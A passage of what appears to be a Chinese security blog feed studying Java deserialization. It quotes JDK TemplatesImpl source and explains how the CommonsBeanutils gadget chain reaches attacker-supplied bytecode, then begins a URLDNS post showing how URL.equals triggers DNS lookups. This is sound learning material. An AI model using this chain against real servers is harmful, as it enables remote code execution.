&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">private&lt;/span> Translet &lt;span style="color:#a6e22e">getTransletInstance&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> TransformerConfigurationException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>_name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>_class &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> defineTransletClasses&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// The translet needs to keep a reference to all its auxiliary
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// class to prevent the GC from collecting them
&lt;/span>&lt;span style="color:#75715e">&lt;/span> AbstractTranslet translet &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>AbstractTranslet&lt;span style="color:#f92672">)&lt;/span> _class&lt;span style="color:#f92672">[&lt;/span>_transletIndex&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#a6e22e">newInstance&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
translet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">postInitialization&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
translet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setTemplates&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
translet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setOverrideDefaultParser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>_overrideDefaultParser&lt;span style="color:#f92672">);&lt;/span>
translet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setAllowedProtocols&lt;/span>&lt;span style="color:#f92672">(&lt;/span>_accessExternalStylesheet&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>_auxClasses &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
translet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setAuxiliaryClasses&lt;/span>&lt;span style="color:#f92672">(&lt;/span>_auxClasses&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> translet&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>InstantiationException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg&lt;span style="color:#f92672">(&lt;/span>ErrorMsg&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">TRANSLET_OBJECT_ERR&lt;/span>&lt;span style="color:#f92672">,&lt;/span> _name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException&lt;span style="color:#f92672">(&lt;/span>err&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>IllegalAccessException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg&lt;span style="color:#f92672">(&lt;/span>ErrorMsg&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">TRANSLET_OBJECT_ERR&lt;/span>&lt;span style="color:#f92672">,&lt;/span> _name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException&lt;span style="color:#f92672">(&lt;/span>err&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">defineTransletClasses&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> TransformerConfigurationException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>_bytecodes &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg&lt;span style="color:#f92672">(&lt;/span>ErrorMsg&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">NO_TRANSLET_CLASS_ERR&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException&lt;span style="color:#f92672">(&lt;/span>err&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
TransletClassLoader loader &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>TransletClassLoader&lt;span style="color:#f92672">)&lt;/span>
AccessController&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doPrivileged&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> PrivilegedAction&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransletClassLoader&lt;span style="color:#f92672">(&lt;/span>ObjectFactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">findClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span>_tfactory&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getExternalExtensionsMap&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">});&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> classCount &lt;span style="color:#f92672">=&lt;/span> _bytecodes&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
_class &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Class&lt;span style="color:#f92672">[&lt;/span>classCount&lt;span style="color:#f92672">];&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>classCount &lt;span style="color:#f92672">&amp;gt;&lt;/span> 1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
_auxClasses &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span> i &lt;span style="color:#f92672">&amp;lt;&lt;/span> classCount&lt;span style="color:#f92672">;&lt;/span> i&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
_class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> loader&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">defineClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>_bytecodes&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]);&lt;/span>
&lt;span style="color:#66d9ef">final&lt;/span> Class superClass &lt;span style="color:#f92672">=&lt;/span> _class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#a6e22e">getSuperclass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">// Check if this is the main class
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>superClass&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>ABSTRACT_TRANSLET&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
_transletIndex &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
_auxClasses&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>_class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> _class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>_transletIndex &lt;span style="color:#f92672">&amp;lt;&lt;/span> 0&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
ErrorMsg err&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg&lt;span style="color:#f92672">(&lt;/span>ErrorMsg&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR&lt;/span>&lt;span style="color:#f92672">,&lt;/span> _name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException&lt;span style="color:#f92672">(&lt;/span>err&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ClassFormatError e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg&lt;span style="color:#f92672">(&lt;/span>ErrorMsg&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">TRANSLET_CLASS_ERR&lt;/span>&lt;span style="color:#f92672">,&lt;/span> _name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException&lt;span style="color:#f92672">(&lt;/span>err&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>LinkageError e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg&lt;span style="color:#f92672">(&lt;/span>ErrorMsg&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">TRANSLET_OBJECT_ERR&lt;/span>&lt;span style="color:#f92672">,&lt;/span> _name&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException&lt;span style="color:#f92672">(&lt;/span>err&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以可以总结:&lt;code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/code>的&lt;code>_bytecodes&lt;/code>属性可以包含类的字节码，通过&lt;code>newTransformer&lt;/code>方法可以调用字节码对应类的构造函数或者静态函数。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TemplatesImpl&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Templates&lt;span style="color:#f92672">,&lt;/span> Serializable &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> serialVersionUID &lt;span style="color:#f92672">=&lt;/span> 673094361519270707L&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String DESERIALIZE_TRANSLET &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;jdk.xml.enableTemplatesImplDeserialization&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * Name of the superclass of all translets. This is needed to * determine which, among all classes comprising a translet, * is the main one. */&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String ABSTRACT_TRANSLET
&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * Name of the main class or default name if unknown. */&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> String _name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * Contains the actual class definition for the translet class and * any auxiliary classes. */&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> _bytecodes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>总结一下过程：PriorityQueue对象在反序列化过程中会触发排序，调用comparator.compare，在BeanComparator.compare方法中会尝试获取类的property对应的成员的值，其方法是通过尝试获取成员值对应的getter方法，而后调用这个getter方法。&lt;/p>
&lt;p>而TemplatesImpl类的_bytecodes可以存储字节码并且可以通过newTransformer方法调用这个字节码对应类的构造函数或者静态方法，TemplatesImpl类的getOutputProperties方法会调用newTransformer方法。&lt;/p>
&lt;p>而getOutputProperties在规范中对应于outputProperties的getter方法，最终构成反序列化链。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>创建于2024-01-11&lt;/p>
&lt;p>&lt;strong>Created at 2024-01-12T14:32:08+08:00&lt;/strong>&lt;/p></description></item><item><title>JAVA URL DNS 研究</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</link><pubDate>Mon, 08 Jan 2024 16:57:37 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</guid><description>&lt;p>&lt;strong>前言&lt;/strong>&lt;/p>
&lt;p>初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_
&lt;a href="mailto:whipper.0p@icloud.com">whipper.0p@icloud.com&lt;/a>&lt;/p>
&lt;h4 id="url类dns请求">URL类DNS请求&lt;/h4>
&lt;p>使用URL.equals会发起DNS请求&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">urltest&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> MalformedURLException &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hello &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
URL u &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://www.baidu.com&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
URL u1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://www.baidu.com&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/urldns.zh-cn.assets/2.png" />&lt;/p>
&lt;p>跟进代码，equals代码如下，&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URL u1&lt;span style="color:#f92672">,&lt;/span> URL u2&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
String ref1 &lt;span style="color:#f92672">=&lt;/span> u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRef&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
String ref2 &lt;span style="color:#f92672">=&lt;/span> u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getRef&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ref1 &lt;span style="color:#f92672">==&lt;/span> ref2 &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">(&lt;/span>ref1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ref1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>ref2&lt;span style="color:#f92672">)))&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
sameFile&lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">,&lt;/span> u2&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">sameFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URL u1&lt;span style="color:#f92672">,&lt;/span> URL u2&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// Compare the protocols.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!((&lt;/span>u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProtocol&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProtocol&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">||&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProtocol&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProtocol&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getProtocol&lt;/span>&lt;span style="color:#f92672">()))))&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// Compare the files.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!(&lt;/span>u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">==&lt;/span> u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">||&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFile&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getFile&lt;/span>&lt;span style="color:#f92672">()))))&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// Compare the ports.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> port1&lt;span style="color:#f92672">,&lt;/span> port2&lt;span style="color:#f92672">;&lt;/span>
port1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPort&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span> u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPort&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">:&lt;/span> u1&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDefaultPort&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
port2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPort&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span> u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getPort&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">:&lt;/span> u2&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDefaultPort&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>port1 &lt;span style="color:#f92672">!=&lt;/span> port2&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// Compare the hosts.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>hostsEqual&lt;span style="color:#f92672">(&lt;/span>u1&lt;span style="color:#f92672">,&lt;/span> u2&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>hostsEqual方法中会调用getHostAddress方法，getHostAddress方法会通过InetAddress.getByName函数获取到域名对应的IP地址，触发DNS解析&lt;/p>
